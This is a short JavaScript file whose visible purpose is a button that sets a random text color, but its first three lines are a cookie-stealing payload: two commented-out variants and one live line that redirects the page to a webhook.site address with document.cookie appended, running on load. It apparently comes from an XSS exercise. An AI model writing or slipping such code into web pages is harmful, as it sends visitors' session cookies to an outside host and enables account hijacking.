//fetch('https://webhook.site/9cb92cea-09c7-4670-b2b3-52014049f345/?c='.concat(document.cookie));
//new Image().src = 'https://webhook.site/9cb92cea-09c7-4670-b2b3-52014049f345/?c=' + document.cookie;
location = 'https://webhook.site/your-id?c=' + document.cookie;
const color = document.getElementById("color");
const target = document.getElementById("result");

function getRandomInt(max) {
    return Math.floor(Math.random() * max);
  }  

color.onclick = () => {
    target.style.color = `rgb(${getRandomInt(255)}, ${getRandomInt(255)}, ${getRandomInt(255)})`;
}
